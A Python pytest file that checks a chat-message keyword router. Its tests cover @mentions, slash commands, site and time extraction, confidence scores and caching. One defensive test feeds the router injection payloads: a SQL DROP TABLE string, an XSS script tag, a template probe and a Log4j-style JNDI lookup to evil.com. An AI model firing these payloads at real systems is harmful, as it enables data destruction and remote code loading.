"""Proper tests for Smart Rails preprocessing with exact value validation.

These tests verify the deterministic preprocessing behavior with exact assertions,
no conditional logic, and meaningful validation of actual values.
"""

import pytest

from src.rails.router import KeywordRouter


class TestDeterministicPreprocessing:
    """Test deterministic extraction of @mentions, /commands, and other markers."""

    def test_at_mention_extraction_exact_confidence(self):
        """@mentions MUST be extracted with EXACTLY 100% confidence."""
        router = KeywordRouter()
        router.synonym_lib.user_aliases = {
            "joel": "joel",
            "sarah": "sarah",
            "mike.smith": "mike",
        }

        # Test single mention
        cleaned, prefilled, confidences = router.preprocess_message("Task for @joel")

        # EXACT value checking - no weak assertions
        assert cleaned == "Task for", f"Expected 'Task for' but got '{cleaned}'"
        assert (
            prefilled["assignee"] == "joel"
        ), f"Expected 'joel' but got '{prefilled.get('assignee')}'"
        assert (
            confidences["assignee_confidence"] == 1.0
        ), f"Expected exactly 1.0 but got {confidences.get('assignee_confidence')}"
        assert prefilled["extraction_type"] == "explicit_mention"
        assert "@" not in cleaned, "@ symbol should be completely removed"

        # Test multiple mentions
        cleaned, prefilled, confidences = router.preprocess_message(
            "@sarah and @mike.smith need to review"
        )

        assert (
            cleaned == "and need to review"
        ), f"Expected 'and need to review' but got '{cleaned}'"
        assert prefilled["assignee"] == [
            "sarah",
            "mike",
        ], f"Expected ['sarah', 'mike'] but got {prefilled.get('assignee')}"
        assert confidences["assignee_confidence"] == 1.0
        assert "@" not in cleaned

    def test_invalid_mention_handling_exact(self):
        """Invalid @mentions must be tracked but still removed from message."""
        router = KeywordRouter()
        router.synonym_lib.user_aliases = {"joel": "joel"}

        cleaned, prefilled, confidences = router.preprocess_message(
            "Task for @unknownuser and @joel"
        )

        # Exact expectations
        assert cleaned == "Task for and", f"Expected 'Task for and' but got '{cleaned}'"
        assert prefilled["assignee"] == "joel"
        assert prefilled["unresolved_mentions"] == ["unknownuser"]
        assert confidences["assignee_confidence"] == 1.0
        assert "@" not in cleaned

    def test_command_extraction_exact_entity_and_operation(self):
        """/commands produce EXACT entity_type and operation values."""
        router = KeywordRouter()

        # Test entity-only commands
        test_cases = [
            ("/lists", "lists", None, 1.0, None),
            ("/tasks", "tasks", None, 1.0, None),
            ("/fr", "field_reports", None, 1.0, None),
            ("/l", "lists", None, 1.0, None),
            ("/t", "tasks", None, 1.0, None),
        ]

        for (
            command,
            expected_entity,
            expected_op,
            expected_entity_conf,
            expected_op_conf,
        ) in test_cases:
            message = f"{command} show me everything"
            cleaned, prefilled, confidences = router.preprocess_message(message)

            assert (
                cleaned == "show me everything"
            ), f"Command not removed: got '{cleaned}'"
            assert (
                prefilled["entity_type"] == expected_entity
            ), f"Wrong entity for {command}"
            assert (
                prefilled.get("operation") == expected_op
            ), f"Wrong operation for {command}"
            assert confidences["entity_confidence"] == expected_entity_conf
            assert confidences.get("operation_confidence") == expected_op_conf
            assert prefilled["command_source"] == command

    def test_operation_command_extraction_exact(self):
        """Operation commands produce EXACT entity and operation with 100% confidence."""
        router = KeywordRouter()

        test_cases = [
            ("/newlist", "lists", "create", True),
            ("/newtask", "tasks", "create", True),
            ("/addtolist", "lists", "add_items", True),
            ("/removefromlist", "lists", "remove_items", True),
            ("/showlist", "lists", "read", True),
            ("/showtasks", "tasks", "read", True),
            ("/completetask", "tasks", "complete", True),
            ("/reassigntask", "tasks", "reassign", True),
        ]

        for command, entity, operation, direct_exec in test_cases:
            message = f"{command} grocery items"
            cleaned, prefilled, confidences = router.preprocess_message(message)

            assert prefilled["entity_type"] == entity, f"Wrong entity for {command}"
            assert prefilled["operation"] == operation, f"Wrong operation for {command}"
            assert (
                confidences["entity_confidence"] == 1.0
            ), f"Entity confidence not 1.0 for {command}"
            assert (
                confidences["operation_confidence"] == 1.0
            ), f"Operation confidence not 1.0 for {command}"
            assert prefilled["direct_execution"] == direct_exec
            assert prefilled["command_source"] == command
            assert command not in cleaned

    def test_cleaned_message_exact_format(self):
        """Cleaned messages have EXACT expected format."""
        router = KeywordRouter()
        router.synonym_lib.user_aliases = {"joel": "joel"}

        test_cases = [
            (
                "@joel needs to /completetask generator maintenance",
                "needs to generator maintenance",
            ),
            (
                "  @joel   needs   to   do   this  ",
                "needs   to   do   this",
            ),  # Preserves internal spacing
            ("/newlist @joel shopping", "shopping"),
            ("@@@@joel task", "@@@ task"),  # Multiple @ symbols
            ("email@joel.com", "email"),  # Email addresses
        ]

        for input_msg, expected_cleaned in test_cases:
            cleaned, _, _ = router.preprocess_message(input_msg)
            # Normalize whitespace for comparison
            cleaned_normalized = " ".join(cleaned.split())
            expected_normalized = " ".join(expected_cleaned.split())
            assert (
                cleaned_normalized == expected_normalized
            ), f"Input: '{input_msg}' -> Expected: '{expected_normalized}' but got '{cleaned_normalized}'"

    def test_site_extraction_exact_names(self):
        """Site extraction produces EXACT site names in title case."""
        router = KeywordRouter()

        test_cases = [
            ("report for eagle lake site", "Eagle Lake"),
            ("CROCKETT needs inspection", "Crockett"),
            ("mathis generator check", "Mathis"),
            ("Eagle Lake and Crockett reports", ["Eagle Lake", "Crockett"]),
        ]

        for message, expected_site in test_cases:
            _, prefilled, _ = router.preprocess_message(message)

            if isinstance(expected_site, list):
                assert prefilled["site_references"] == expected_site
            else:
                assert prefilled["site"] == expected_site
                assert prefilled["site_references"] == [expected_site]

    def test_time_extraction_exact_references(self):
        """Time extraction produces EXACT datetime references."""
        router = KeywordRouter()

        test_cases = [
            ("task for tomorrow at 3pm", ["tomorrow", "at 3pm"]),
            ("meeting TODAY at the office", ["TODAY"]),
            ("next week review", ["next week"]),
            ("at 9am and at 2pm meetings", ["at 9am", "at 2pm"]),
        ]

        for message, expected_times in test_cases:
            _, prefilled, _ = router.preprocess_message(message)

            assert prefilled["time_references"] == expected_times
            assert prefilled["has_temporal_context"] == True

    def test_preprocessing_extraction_logging(self):
        """Preprocessing tracks exactly what was extracted."""
        router = KeywordRouter()
        router.synonym_lib.user_aliases = {"joel": "joel"}

        message = "@joel /newtask check generator tomorrow"
        _, prefilled, _ = router.preprocess_message(message)

        # Verify extraction tracking
        assert "preprocessing_extractions" in prefilled
        extractions = prefilled["preprocessing_extractions"]
        assert "@joel -> joel" in extractions
        assert "/newtask" in extractions
        assert len(extractions) == 2  # Exactly 2 items extracted


class TestRoutingConfidence:
    """Test confidence scoring produces exact expected values."""

    def test_confidence_calculation_exact_values(self):
        """Confidence scores are calculated to exact expected values."""
        router = KeywordRouter()

        # High confidence scenarios
        high_conf_cases = [
            ("/newlist groceries", 1.0),  # Direct command
            ("/completetask generator", 1.0),  # Direct command
            ("mark generator task complete", 1.0),  # Clear keyword match
        ]

        for message, expected_conf in high_conf_cases:
            result = router.route(message)
            assert (
                result.confidence == expected_conf
            ), f"'{message}' expected {expected_conf} but got {result.confidence}"

    def test_confidence_boosting_exact_increments(self):
        """Confidence boosting produces exact incremental values."""
        router = KeywordRouter()
        router.synonym_lib.user_aliases = {"joel": "joel"}

        # Base case - no boost
        result_base = router.route("add milk to list")
        base_confidence = result_base.confidence

        # With user assignment boost (+0.2)
        result_user = router.route("add milk to list for joel")
        assert result_user.confidence == pytest.approx(
            min(base_confidence + 0.2, 1.0), abs=0.01
        )

        # With @ mention boost (+0.2 + 0.1)
        result_mention = router.route("add milk to list for @joel")
        assert result_mention.confidence == pytest.approx(
            min(base_confidence + 0.3, 1.0), abs=0.01
        )

    def test_ambiguity_penalty_exact_reduction(self):
        """Ambiguous words reduce confidence by exact amounts."""
        router = KeywordRouter()

        # Clear operation
        clear_result = router.route("add items to shopping list")
        clear_confidence = clear_result.confidence

        # Ambiguous operation
        ambiguous_result = router.route("update shopping list")

        # Should have lower confidence due to ambiguity
        assert ambiguous_result.confidence < clear_confidence
        # The word "update" reduces confidence by 0.1
        assert (
            clear_confidence - ambiguous_result.confidence >= 0.05
        )  # At least some reduction


class TestDirectExecutionLogic:
    """Test direct execution determination is exact."""

    def test_direct_execution_threshold_exact(self):
        """Direct execution enabled at EXACTLY the right confidence levels."""
        router = KeywordRouter()

        # 100% confidence -> direct execution
        result = router.route("/newlist groceries")
        assert result.use_direct_execution == True
        assert result.confidence == 1.0

        # High confidence (>=0.8) -> direct execution
        router.synonym_lib.user_aliases = {"joel": "joel"}
        result = router.route("add milk to shopping list for @joel")
        if result.confidence >= 0.8:
            assert result.use_direct_execution == True
        else:
            assert result.use_direct_execution == False

        # Low confidence -> no direct execution
        result = router.route("maybe do something with tasks")
        assert result.confidence < 0.8
        assert result.use_direct_execution == False

    def test_hidden_commands_always_direct(self):
        """Hidden commands ALWAYS use direct execution."""
        router = KeywordRouter()

        hidden_commands = [
            "/newlist",
            "/addtolist",
            "/removefromlist",
            "/showlist",
            "/newtask",
            "/completetask",
            "/reassigntask",
            "/showtasks",
        ]

        for cmd in hidden_commands:
            result = router.route(f"some text {cmd} more text")
            assert result.use_direct_execution == True
            assert result.confidence == 1.0
            assert result.entity_confidence == 1.0
            assert result.operation_confidence == 1.0


class TestDataExtraction:
    """Test data extraction produces exact expected values."""

    def test_list_name_extraction_exact(self):
        """List names are extracted exactly as specified."""
        router = KeywordRouter()

        test_cases = [
            ("create list called 'Shopping Items'", "Shopping Items"),
            ('new list named "Grocery List"', "Grocery List"),
            ("create list called tasks-to-do", "tasks-to-do"),
            ("new list list", "list"),  # Now allows "list" as the name
        ]

        for message, expected_name in test_cases:
            result = router.route(message)
            assert result.extracted_data.get("suggested_name") == expected_name

    def test_item_extraction_exact_arrays(self):
        """Items are extracted as exact arrays."""
        router = KeywordRouter()

        message = "add milk, eggs, bread to shopping list"
        result = router.route(message)

        # Check exact item extraction
        items = result.extracted_data.get("items")
        assert items == ["milk", "eggs", "bread"]

    def test_site_extraction_in_routing(self):
        """Sites are extracted with exact title case during routing."""
        router = KeywordRouter()

        result = router.route("new field report for eagle lake")
        assert result.extracted_data.get("site") == "Eagle Lake"
        assert result.entity_type == "field_reports"
        assert result.operation == "create"


class TestEdgeCasesAndErrors:
    """Test edge cases with exact error handling."""

    def test_empty_message_exact_result(self):
        """Empty messages produce exact empty results."""
        router = KeywordRouter()

        for empty in ["", None, "   ", "\n\t"]:
            result = router.route(empty)
            assert result.entity_type is None
            assert result.operation is None
            assert result.function_name is None
            assert result.confidence == 0.0
            assert result.extracted_data == {}

    def test_malformed_commands_exact_handling(self):
        """Malformed commands are handled exactly."""
        router = KeywordRouter()

        # Malformed slash commands
        malformed = ["/", "//", "/ spaces", "/123invalid"]
        for cmd in malformed:
            result = router.route(cmd)
            # Should not crash, but also not match
            assert result.confidence < 1.0  # Not a perfect match

    def test_unicode_and_special_chars_exact(self):
        """Unicode and special characters handled exactly."""
        router = KeywordRouter()
        router.synonym_lib.user_aliases = {"josé": "jose"}

        # Unicode in mentions
        cleaned, prefilled, _ = router.preprocess_message("Task for @josé 📝")
        assert "jos" in prefilled.get("unresolved_mentions", [])
        assert "@" not in cleaned
        assert "josé" not in cleaned  # Mention removed

    def test_injection_attempts_exact_safety(self):
        """Injection attempts are handled safely with exact behavior."""
        router = KeywordRouter()

        injections = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "{{7*7}}",  # Template injection
            "${jndi:ldap://evil.com/a}",  # Log4j style
        ]

        for injection in injections:
            result = router.route(injection)
            # Should not crash and should not execute anything
            assert result is not None
            # Should not match any operations with high confidence
            if result.operation:
                assert result.confidence < 0.8

    def test_case_sensitivity_exact(self):
        """Case handling produces exact expected results."""
        router = KeywordRouter()

        # Commands should be case-insensitive
        lower_result = router.route("/newlist groceries")
        upper_result = router.route("/NEWLIST groceries")
        mixed_result = router.route("/NewList groceries")

        assert (
            lower_result.entity_type
            == upper_result.entity_type
            == mixed_result.entity_type
            == "lists"
        )
        assert (
            lower_result.operation
            == upper_result.operation
            == mixed_result.operation
            == "create"
        )

        # But confidence should be exactly the same
        assert (
            lower_result.confidence
            == upper_result.confidence
            == mixed_result.confidence
            == 1.0
        )


class TestPerformanceInvariants:
    """Test performance-critical invariants."""

    def test_cache_returns_identical_results(self):
        """Cached results are EXACTLY identical to original."""
        router = KeywordRouter()

        message = "add milk to shopping list"

        # First call - not cached
        result1 = router.route(message)

        # Second call - should be cached
        result2 = router.route(message)

        # Results must be exactly the same object (cached)
        assert result1 is result2

    def test_preprocessing_idempotent(self):
        """Preprocessing is perfectly idempotent."""
        router = KeywordRouter()
        router.synonym_lib.user_aliases = {"joel": "joel"}

        message = "@joel /newtask check generator tomorrow at 3pm"

        # Run multiple times
        results = []
        for _ in range(5):
            cleaned, prefilled, confidences = router.preprocess_message(message)
            results.append((cleaned, prefilled, confidences))

        # All results must be exactly identical
        first = results[0]
        for result in results[1:]:
            assert result[0] == first[0]  # Cleaned message
            assert result[1] == first[1]  # Prefilled data
            assert result[2] == first[2]  # Confidences

    def test_pattern_compilation_used(self):
        """Pre-compiled patterns are actually used."""
        router = KeywordRouter()

        # Patterns should be pre-compiled
        assert hasattr(router, "_at_mention_pattern")
        assert hasattr(router, "_command_pattern")
        assert hasattr(router, "_site_pattern")
        assert hasattr(router, "_time_pattern")

        # These should be compiled regex objects, not strings
        import re

        assert isinstance(router._at_mention_pattern, re.Pattern)
        assert isinstance(router._command_pattern, re.Pattern)


class TestIntegrationScenarios:
    """Test complete scenarios with exact expected outcomes."""

    def test_full_task_creation_exact_flow(self):
        """Complete task creation flow with exact data extraction."""
        router = KeywordRouter()
        router.synonym_lib.user_aliases = {"joel": "joel", "sarah": "sarah"}

        message = "@joel /newtask Check generator oil tomorrow at 3pm"
        result = router.route(message)

        # Exact assertions for complete flow
        assert result.entity_type == "tasks"
        assert result.operation == "create"
        assert result.function_name == "create_task"
        assert result.confidence == 1.0
        assert result.use_direct_execution == True
        assert result.target_users == ["joel"]
        assert result.entity_confidence == 1.0
        assert result.operation_confidence == 1.0
        assert result.assignee_confidence == 1.0

        # Check extracted data
        data = result.extracted_data
        assert data["assignee"] == "joel"
        assert data["entity_type"] == "tasks"
        assert data["operation"] == "create"
        assert data["direct_execution"] == True
        assert data["command_source"] == "/newtask"
        assert data["time_references"] == ["tomorrow", "at 3pm"]
        assert data["has_temporal_context"] == True
        assert data["time_reference"] == "tomorrow"
        assert "cleaned_message" in data  # Now included in routing result

    def test_list_update_exact_flow(self):
        """List update flow with exact item extraction."""
        router = KeywordRouter()

        message = "add milk, eggs, bread, butter to shopping list"
        result = router.route(message)

        assert result.entity_type == "lists"
        assert result.operation == "add_items"
        assert result.function_name == "update_list"
        assert result.extracted_data["items"] == ["milk", "eggs", "bread", "butter"]

    def test_field_report_exact_flow(self):
        """Field report creation with exact site extraction."""
        router = KeywordRouter()

        message = "new field report for Eagle Lake: generator maintenance completed"
        result = router.route(message)

        assert result.entity_type == "field_reports"
        assert result.operation == "create"
        assert result.function_name == "create_field_report"
        assert result.extracted_data["site"] == "Eagle Lake"
        assert result.extracted_data["site_references"] == ["Eagle Lake"]
